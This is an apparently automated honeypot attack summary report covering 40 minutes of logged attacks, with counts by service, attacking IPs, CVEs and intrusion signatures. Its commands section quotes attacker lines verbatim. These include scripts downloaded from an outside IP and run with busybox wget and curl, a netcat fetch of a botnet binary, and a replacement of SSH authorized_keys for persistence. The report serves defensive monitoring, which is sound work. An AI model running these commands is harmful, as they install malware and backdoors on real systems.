Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-08T20:01:31Z
**Timeframe:** 2025-10-08T19:20:01Z to 2025-10-08T20:00:01Z
**Log Files:**
- agg_log_20251008T192001Z.json
- agg_log_20251008T194001Z.json
- agg_log_20251008T200001Z.json

**Executive Summary**

This report summarizes 12,467 attacks recorded by honeypots over a 40-minute period. The most targeted services were Cowrie (SSH/Telnet), Honeytrap, and Ciscoasa. The majority of attacks originated from IP address 45.78.192.92. Attackers primarily targeted port 25 (SMTP), with port 22 (SSH) also being a significant target. Multiple CVEs were identified, and a variety of shell commands were executed, indicating attempts to establish persistence and gather system information.

**Detailed Analysis**

***Attacks by Honeypot***

- Cowrie: 4715
- Honeytrap: 2675
- Ciscoasa: 1657
- Suricata: 1575
- Mailoney: 910
- Dionaea: 388
- Sentrypeer: 144
- Heralding: 130
- Redishoneypot: 99
- H0neytr4p: 77
- Tanner: 38
- Adbhoney: 29
- Honeyaml: 14
- ConPot: 6
- ElasticPot: 4
- Dicompot: 4
- ssh-rsa: 2

***Top Attacking IPs***

- 45.78.192.92
- 176.65.141.117
- 178.128.41.154
- 167.71.113.21
- 182.176.149.227
- 165.232.105.167
- 103.250.10.128
- 154.12.82.166
- 103.176.20.115
- 35.246.248.48

***Top Targeted Ports/Protocols***

- 25
- 22
- 445
- 5903
- TCP/5900
- 5060
- vnc/5900
- 8333
- 1024
- 6379

***Most Common CVEs***

- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2005-4050
- CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255
- CVE-2019-11500 CVE-2019-11500
- CVE-2021-3449 CVE-2021-3449
- CVE-2018-10562 CVE-2018-10561

***Commands Attempted by Attackers***

- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; curl http://213.209.143.62/c.sh; sh c.sh; wget http://213.209.143.62/wget.sh; sh wget.sh; curl http://213.209.143.62/wget.sh; sh wget.sh; busybox wget http://213.209.143.62/wget.sh; sh wget.sh; busybox curl http://213.209.143.62/wget.sh; sh wget.sh
- cd /data/local/tmp; su 0 mkdir .kittylover321 || mkdir .kittylover321; cd .kittylover321; toybox nc 84.200.81.239 3338 > boatnet.arm7; ...
- echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh

***Signatures Triggered***

- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41
- 2400040
- ET SCAN NMAP -sS window 1024
- 2009582
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- 2023753
- ET INFO VNC Authentication Failure
- 2002920

***Users / Login Attempts***

- User-Agent: Go-http-client/1.1/Connection: close
- 345gs5662d34/345gs5662d34
- pos/pos
- root/
- unknown/uploader
- supervisor/webmaster
- operator/qwerty12345
- support/1313
- operator/qwer1234
- super/super!

***Files Uploaded/Downloaded***

- gpon80&ipv=0
- wget.sh;
- w.sh;
- c.sh;

***HTTP User-Agents***

- No significant user agents were logged.

***SSH Clients and Servers***

- **Clients:** No significant SSH clients were logged.
- **Servers:** No significant SSH servers were logged.

***Top Attacker AS Organizations***

- No AS organization data was available in the logs.

**Key Observations and Anomalies**

- A significant number of commands are focused on establishing SSH persistence by adding a public key to `authorized_keys`.
- Attackers are frequently attempting to gather detailed system information, including CPU, memory, and disk space.
- The use of `busybox` and `toybox` suggests attacks targeting embedded or IoT devices.
- The presence of commands attempting to download and execute shell scripts from external URLs indicates attempts to install malware or backdoors.
- A high number of VNC authentication failures were observed, suggesting brute-force attacks against VNC servers.
- The logs show evidence of scanning activity from multiple sources, as indicated by the NMAP and MS Terminal Server scan signatures.
- The "ET DROP Dshield Block Listed Source group 1" and "ET DROP Spamhaus DROP Listed Traffic Inbound group 41" signatures are the most frequently triggered, indicating that many of the attacking IPs are known bad actors.

This concludes the Honeypot Attack Summary Report.
